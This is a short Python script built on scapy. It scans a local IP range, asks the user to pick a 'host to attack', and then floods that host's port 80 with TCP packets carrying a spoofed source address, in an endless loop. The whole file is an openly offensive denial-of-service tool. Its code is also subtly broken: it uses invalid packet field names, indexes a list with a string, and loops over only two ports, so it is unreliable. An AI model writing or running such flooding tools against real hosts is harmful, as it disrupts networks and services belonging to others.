from ip_scan import ipscan
from scapy.all import *
import argparse
def send_packet(target_ip, source_ip, source_port):
    IP1 = IP(source_IP=source_ip, destination=target_ip)
    TCP1 = TCP(srcport = source_port, dstport = 80)
    pkt = IP1 / TCP1
    send(pkt, inter = .001)
def main(ip_range, interface):
    ip_adrr = ipscan(ip_range,interface)
    out = []
    count = 0
    for ip in ip_adrr:
        msg = f"|{count}|{ip}|"
        out.append(msg)
        count = count + 1
    print("|sno|ip addr|")
    for msg in out:
        print(msg)
    x = input("input sno of host to attack")
    try:
        y=ip_adrr[x]
    except:
        print("not a valid ip")
        x = input("input sno of host to attack")
    source_ip = "192.168.0.1"
    while True:
        for source_port in (1,65535):
            send_packet(y, source_ip,source_port)

parser = argparse.ArgumentParser()
parser.add_argument("--range", type=str, help="input ip range")
parser.add_argument("--interface", type=str, help="interface to use for attack")

args = parser.parse_args()

def launch(args):
    try:
        ip_range = args.range
        interface = args.interface
        main(ip_range, interface)
    except:
        print("missing arguments ip range or interface use --help for more information")

if __name__ == "__main__":
    launch(args)